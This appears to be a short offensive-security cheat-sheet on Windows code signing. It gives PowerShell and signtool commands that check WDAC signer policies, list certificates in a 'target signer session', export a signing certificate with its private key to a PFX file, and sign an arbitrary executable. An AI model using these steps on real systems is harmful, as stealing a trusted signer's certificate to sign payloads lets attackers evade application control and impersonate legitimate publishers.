---
title: "Windows Code Signing"
tags: ["Code Signing", "Executable", "Certificate", "CA", "Signtool", "Authenticode", "Digital Signature", "AppLocker", "Defender", "WDAC", "Windows"]
---

{{< tab set1 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Check WDAC Policies

```console
# Look for '<Signers>' section in policies xml
ls C:\programdata\policies
```

#### 2. Check Certificate

```console
# In target signer session
Set-Location Cert:\CurrentUser\My
```

```console
# List certificates
ls Cert:\CurrentUser\My
```

#### 3. Export Certificate

```console
# Create a passphrase
$pass = ConvertTo-SecureString -String "<PASSWORD>" -Force -AsPlainText
```

```console
# Export certificate
Get-ChildItem -Path Cert:\CurrentUser\My\<THUMBPRINT> | Export-PfxCertificate -FilePath C:\Programdata\cert.pfx -Password $pass
```

#### 4. Code Signing

```console
.\signtool.exe sign /fd SHA256 /f "C:\Programdata\cert.pfx" /p "<PASSWORD>" "<EXE>"
```

#### 5. Check

```console
Get-AuthenticodeSignature "<EXE>"
```

{{< /tabcontent >}}